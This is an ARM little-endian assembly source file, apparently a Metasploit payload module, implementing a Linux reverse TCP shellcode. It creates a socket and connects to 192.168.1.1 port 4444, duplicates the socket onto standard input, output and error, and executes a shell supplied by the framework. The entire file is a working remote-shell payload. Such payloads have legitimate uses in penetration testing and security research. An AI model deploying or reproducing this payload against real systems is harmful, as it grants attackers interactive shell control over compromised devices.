@@
@
@        Name: single_sock_reverse
@   Qualities: -
@     Authors: civ, repmovsb
@     License: MSF_LICENSE
@ Description:
@
@        Implementation of a Linux reverse TCP shellcode for ARM LE architecture.
@
@        This source is built from the payload module (instead of other way around...)
@
@        Assemble with: as single_sock_reverse.s -o single_sock_reverse.o
@        Link with:     ld single_sock_reverse.o -o single_sock_reverse
@
@ Meta-Information:
@
@ meta-shortname=Linux Reverse TCP
@ meta-description=Connect back to the framework and run a second stage
@ meta-authors=civ, repmovsb
@ meta-os=linux
@ meta-arch=armle
@ meta-category=singles
@ meta-connection-type=reverse
@ meta-name=reverse_tcp
@@

.text
.globl _start
_start:
@ int socket(int domain, int type, int protocol);
@ socket(2,1,6)
       mov     r0, #2
       mov     r1, #1
       add     r2, r1, #5
       mov     r7, #140
       add     r7, r7, #141
       svc     0

@ connect(soc, socaddr, 0x10)
       mov     r6, r0
       add     r1, pc, #96
       mov     r2, #16
       mov     r7, #141
       add     r7, r7, #142
       svc     0

@ dup2(soc,0) @stdin
       mov     r0, r6
       mov     r1, #0
       mov     r7, #63
       svc     0

@ dup2(soc,1) @stdout
       mov     r0, r6
       mov     r1, #1
       mov     r7, #63
       svc     0

@ dup2(soc,2) @stderr
       mov     r0, r6
       mov     r1, #2
       mov     r7, #63
       svc     0

@ execve(SHELL, [ARGV0], [NULL])
       add     r0, pc, #36
       eor     r4, r4, r4
       push    {r4}
       mov     r2, sp
       add     r4, pc, #36
       push    {r4}
       mov     r1, sp
       mov     r7, #11
       svc     0

@ addr
@ port: 4444 , sin_fam = 2
.word   0x5c110002
@ ip: 192.168.1.1
.word   0x0101a8c0
@.word   0x0100007f

@ SHELL
.word 0x00000000 @ the shell goes here!
.word 0x00000000
.word 0x00000000
.word 0x00000000
@ ARGV0
.word 0x00000000 @ the args!
.word 0x00000000
.word 0x00000000
.word 0x00000000
